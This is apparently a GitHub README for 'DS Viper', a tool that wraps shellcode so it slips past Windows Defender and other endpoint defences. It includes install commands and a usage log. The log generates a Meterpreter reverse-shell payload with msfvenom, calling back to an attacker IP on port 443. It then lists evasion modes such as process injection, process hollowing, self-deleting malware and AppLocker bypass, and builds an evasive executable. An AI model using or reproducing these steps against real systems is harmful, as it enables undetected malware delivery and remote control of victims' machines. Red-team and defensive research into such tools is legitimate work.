# 🐍 **About DS Viper**

**DS Viper** is a powerful tool designed to **bypass Windows Defender's security mechanisms**, enabling seamless execution of payloads on Windows systems without triggering security alerts. It utilizes a combination of **advanced techniques** to manipulate and disguise payloads, providing cybersecurity professionals, red teamers, and penetration testers with a **robust solution** for achieving undetected access.

Whether you're simulating real-world attacks or conducting comprehensive security audits, **DS Viper** serves as an essential tool for testing and improving system defenses.

> **We are constantly working on DS Viper** to enhance its capabilities, improve evasion techniques, and introduce customizable features such as the ability to add your own payloads or keywords.

---

<p align="center">
  <img src="https://github.com/dagowda/DSViper/blob/c24161c9c055bd94be03624cf8d1c8d9849df59c/img/screenshot1.jpg" alt="image_alt">
</p>

# ✔️ **Installation**

Clone the repository and set up the environment.

### **Option 1: Manual Installation**
```bash
git clone https://github.com/dagowda/DSViper.git
cd DSViper
pip install -r requirements.txt
sudo apt-get update
sudo apt-get install -y mingw-w64
sudo apt install mono-complete
chmod +x MASM-compatible/uasm
sudo cp MASM-compatible/uasm /usr/bin/uasm
```

### **Option 2: Scripted Installation (Recommended)**
If you prefer an automated setup, use the provided script:

```bash
chmod +x install_dependencies.sh
./install_dependencies.sh
```

---

# ⚙️ **Usage**

Make the `DSViper` binary executable and run it:

```bash
➜  DSViper git:(main) ✗ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.130.175 LPORT=443 -f raw > payload.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201798 bytes
➜  DSViper git:(main) ✗ python3 DSViper.py

            
                                                                                                                                                                     
░▒▓███████▓▒░ ░▒▓███████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░                                                                          
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░                                                                         
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░              ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░                                                                         
░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░        ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░                                                                          
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░                                                                         
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░                                                                         
░▒▓███████▓▒░░▒▓███████▓▒░          ░▒▓██▓▒░  ░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░                                                                         
                                                                                                                                                                     
................................................                                                                                                                     
                      AntiVirus Bypass Tool (v.0.2.1)                                                                                                                
---------------------------------------------------------                                                                                                            
Created by Dhanush Gowda(dagowda) and Sumanth Vanki                                                                                                                  
---------------------------------------------------------                                                                                                            
................................................                                                                                                                     
                                                                                                                                                                     
                                                                                                                                                                     
You sure you want to Continue?(Use it ethically, and in lab enviroments only) y/n: y                                                                                 
Enter your payload choice:                                                                                                                                           
1.)self-injection(XOR)                                                                                                                                               
2.)self-injection(AES)                                                                                                                                               
3.)Process Injection(spoolsv)(Can be used for lateral movement)                                                                                                      
4.)Process Hollow                                                                                                                                                    
5.)Self Deleting Malware(HAVE TO WAIT, CLOSE TO A MINUTE FOR THE PAYLOAD TO EXECUTE)                                                                                 
6.)DLL side-load/rundll32 applocker bypass                                                                                                                           
7.)Process Injection(explorer.exe)                                                                                                                                   
8.)Powershell(Will bypass with cloud detections enabled as well)(Make sure to run this payload twice)(use x64 payload only)                                          
9.)Applocker bypass small shellcodes(Make sure to use x86 payloads)(Also make sure to change the .exe file name after everyrun on the same victim)(Make sure you run this payload twice)                                                                                                                                                  
10.)Applocker bypass Havoc/large shellcodes(use x86 payloads only)                                                                                                   
11.)Indirect Syscall(Windows 10)(Possible EDR bypass loader)                                                                                                         
>2                                                                                                                                                                   
Please type in the shellcode file name: payload.bin                                                                                                                  
Selected self-injection(AES)                                                                                                                                         
[*]Payload successfully created as DSViper_AES.exe
```

---

## 📄 **Notes**
- Ensure you have **Python 3.8+** installed.
- Run the commands in a terminal with the required permissions.


![image_alt](https://github.com/dagowda/DSViper/blob/c9bc60a60bc73fb523a935b8d188fbec5b1521fa/img/screenshot2.png) 
  
